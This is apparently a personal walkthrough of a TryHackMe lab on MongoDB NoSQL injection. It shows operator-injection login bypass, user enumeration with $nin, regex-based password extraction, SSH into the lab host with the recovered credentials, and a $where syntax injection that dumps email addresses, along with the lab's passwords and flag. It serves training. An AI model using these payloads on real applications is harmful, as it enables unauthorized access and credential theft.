---
title: NoSQL Injection
description: A walkthrough depicting basic NoSQL injections on MongoDB.
---

https://tryhackme.com/room/nosqlinjectiontutorial

A walkthrough depicting basic NoSQL injections on MongoDB.

## Operator Injection: Bypassing the Login Screen
Login screen:
![](../../../../public/images/THM_NoSQL_20250607%20_180950.png)

Login request
```http
POST /login.php HTTP/1.1
Host: 10.10.131.108
Content-Length: 38
Cache-Control: max-age=0
Accept-Language: en-GB,en;q=0.9
Origin: http://10.10.131.108
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://10.10.131.108/
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

user=admin&pass=pasword123&remember=on
```

Payload:
```
user[$ne]=xyz&pass[$ne]=xyz
```

Request
```http
POST /login.php HTTP/1.1
Host: 10.10.131.108
Content-Length: 39
Cache-Control: max-age=0
Accept-Language: en-GB,en;q=0.9
Origin: http://10.10.131.108
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://10.10.131.108/?err=1
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

user[$ne]=xyz&pass[$ne]=xyz&remember=on
```

Return all user documents and as a result we are finally logged into the application:
![](../../../../public/images/THM_NoSQL_20250607%20_182746.png)
Logging in as the first user that the database returned.
## Operator Injection: Logging in as Other Users

Excluding admin user, using `$nin` (not in) operator, to get the next user from the next document
```
user[$nin][]=admin&pass[$ne]=dfdsf&remember=on
```

Found user "pedro", excluding "pedro" to find next user
```
user[$nin][]=admin&user[$nin][]=pedro&pass[$ne]=dfdsf&remember=on
```

Found user "john", excluding "john" to find next user
```
user[$nin][]=admin&user[$nin][]=pedro&user[$nin][]=john&pass[$ne]=dfdsf&remember=on
```
Found user "secret", excluding "secret" to find next user
```
user[$nin][]=admin&user[$nin][]=pedro&user[$nin][]=john&user[$nin][]=secret&pass[$ne]=dfdsf&remember=on
```

Server return invalid user and password which means there is no more users.

Total users are 4: admin, pedro, john and secret

## Operator Injection: Extracting Users' Passwords
Using regex to test the user's password length
```
user=john&pass[$regex]=^.{7}$&remember=on
```

The length is not 7 because the response returns `Location: /?err=1`
```http
HTTP/1.1 302 Found
Date: Sat, 07 Jun 2025 08:53:07 GMT
Server: Apache/2.4.41 (Ubuntu)
Location: /?err=1
Content-Length: 0
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8

```
Using intruder to cycle through the numbers shows the password is 8 characters long
![](../../../../public/images/THM_NoSQL_20250607%20_190614.png)

Guessing the password.
```
user=john&pass[$regex]=^c.......$&remember=on
```

John's password: `10584312`
![](../../../../public/images/THM_NoSQL%20_191413.png)

Pedro's password: `coolpass123`
![](../../../../public/images/THM_NoSQL_20250607%20_195147.png)

SSH with Pedro's creds
```bash
❯ ssh pedro@10.10.131.108                                                        
pedro@10.10.131.108's password:
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.15.0-138-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro
Last login: Wed Jun 23 03:34:24 2021 from 192.168.100.250
```

```bash
pedro@ip-10-10-131-108:~$ la
.bash_history  .bash_logout  .bashrc  .cache  flag.txt  .profile  .viminfo
```

```bash
pedro@ip-10-10-131-108:~$ cat flag.txt
flag{N0Sql_n01iF3!}
```

**Flag** 
```
flag{N0Sql_n01iF3!}
```

## Syntax Injection: Identification and Data Extraction
Authenticating with the provided credentials
![](../../../../public/images/THM_NoSQL_20250607%20_195834.png)

```bash
syntax@10.10.131.108's password:
Please provide the username to receive their email:
```

Syntax injection test
```bash
~ ❯ syntax@10.10.131.108's password:
Please provide the username to receive their email:admin'
Traceback (most recent call last):
  File "/home/syntax/script.py", line 17, in <module>
    for x in mycol.find({"$where": "this.username == '" + username + "'"}):
  File "/home/syntax/venv/lib/python3.8/site-packages/pymongo/synchronous/cursor.py", line 1281, in __next__
    return self.next()
  File "/home/syntax/venv/lib/python3.8/site-packages/pymongo/synchronous/cursor.py", line 1257, in next
    if len(self._data) or self._refresh():
  File "/home/syntax/venv/lib/python3.8/site-packages/pymongo/synchronous/cursor.py", line 1205, in _refresh
    self._send_message(q)
  File "/home/syntax/venv/lib/python3.8/site-packages/pymongo/synchronous/cursor.py", line 1100, in _send_message
    response = client._run_operation(
  File "/home/syntax/venv/lib/python3.8/site-packages/pymongo/_csot.py", line 119, in csot_wrapper
    return func(self, *args, **kwargs)
  File "/home/syntax/venv/lib/python3.8/site-packages/pymongo/synchronous/mongo_client.py", line 1754, in _run_operation
    return self._retryable_read(
  File "/home/syntax/venv/lib/python3.8/site-packages/pymongo/synchronous/mongo_client.py", line 1863, in _retryable_read
    return self._retry_internal(
  File "/home/syntax/venv/lib/python3.8/site-packages/pymongo/_csot.py", line 119, in csot_wrapper
    return func(self, *args, **kwargs)
  File "/home/syntax/venv/lib/python3.8/site-packages/pymongo/synchronous/mongo_client.py", line 1819, in _retry_internal
    return _ClientConnectionRetryable(
  File "/home/syntax/venv/lib/python3.8/site-packages/pymongo/synchronous/mongo_client.py", line 2554, in run
    return self._read() if self._is_read else self._write()
  File "/home/syntax/venv/lib/python3.8/site-packages/pymongo/synchronous/mongo_client.py", line 2697, in _read
    return self._func(self._session, self._server, conn, read_pref)  # type: ignore
  File "/home/syntax/venv/lib/python3.8/site-packages/pymongo/synchronous/mongo_client.py", line 1745, in _cmd
    return server.run_operation(
  File "/home/syntax/venv/lib/python3.8/site-packages/pymongo/synchronous/helpers.py", line 45, in inner
    return func(*args, **kwargs)
  File "/home/syntax/venv/lib/python3.8/site-packages/pymongo/synchronous/server.py", line 227, in run_operation
    _check_command_response(first, conn.max_wire_version)
  File "/home/syntax/venv/lib/python3.8/site-packages/pymongo/helpers_shared.py", line 247, in _check_command_response
    raise OperationFailure(errmsg, code, response, max_wire_version)
pymongo.errors.OperationFailure: SyntaxError: unterminated string literal :
functionExpressionParser@src/mongo/scripting/mozjs/mongohelpers.js:46:25
, full error: {'ok': 0.0, 'errmsg': 'SyntaxError: unterminated string literal :\nfunctionExpressionParser@src/mongo/scripting/mozjs/mongohelpers.js:46:25\n', 'code': 139, 'codeName': 'JSInterpreterFailure'}
Connection to 10.10.131.108 closed.
```

Error shows the code where the variable is injected.
```bash
for x in mycol.find({"$where": "this.username == '" + username + "'"}):
```

The following is an example of how the query would look when manipulated to always return `true`:

```
this.username == 'admin' || '1' == '1'
```

From this, the injected payload would be:
```
admin' || '1' == '1
```

Result:
```bash
~ ❯ ssh syntax@10.10.131.108                                                     syntax@10.10.131.108's password:
Please provide the username to receive their email:admin' || '1' == '1
admin@nosql.int
pcollins@nosql.int
jsmith@nosql.int
Syntax@Injection.FTW
Connection to 10.10.131.108 closed.
```
